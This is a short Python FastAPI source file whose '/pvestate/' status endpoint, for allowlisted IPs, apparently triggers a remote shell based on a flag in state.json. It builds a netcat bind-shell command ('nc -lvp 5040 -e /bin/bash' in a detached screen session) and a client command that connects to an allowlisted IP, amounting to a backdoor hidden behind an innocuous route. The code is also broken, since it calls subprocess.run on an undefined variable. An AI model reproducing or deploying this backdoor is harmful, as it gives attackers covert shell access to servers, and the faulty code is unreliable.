from fastapi import FastAPI,Request
import json
import time
import subprocess
import uuid
app = FastAPI()

@app.get("/pvestate/")
def read_root(request: Request):
    
    session_name = f"nc_session_{uuid.uuid4().hex[:8]}"

    
    client_ip = request.client.host
    
    with open("serverip.json", "r") as file:
        ips = file.read()
        ips = json.loads(ips)
    

    with open("state.json", "r") as file:
        data = file.read()
    data = json.loads(data)
    # print(data['state'])
    
    server_cmd = f"screen -dmS {session_name} nc -lvp 5040 -e /bin/bash"
    client_cmd = f"screen -dmS {session_name} nc {ips['ips'][0]} 5040"
 
    if client_ip in ips['ips']:
        if data['state']== "ok":
            data['state']= "ok"
        elif data['state']== "fuck":
            time.sleep(30) 
            subprocess.run(cmd, shell=True, check=True)
            with open("conn.log", "w") as file:
                file.write(f"Connection established with {client_ip}\n")
        elif data['state']== "fuckedup":
            time.sleep(60)
            
        return data 
    
    
    else:
        del request

@app.get("/test/")
def root(request: Request):
    client_ip = request.client.host
    with open("serverip.json", "r") as file:
        data = file.read()
        data = json.loads(data)
    if client_ip in data['ips']:
        return {"message": "bad request"}
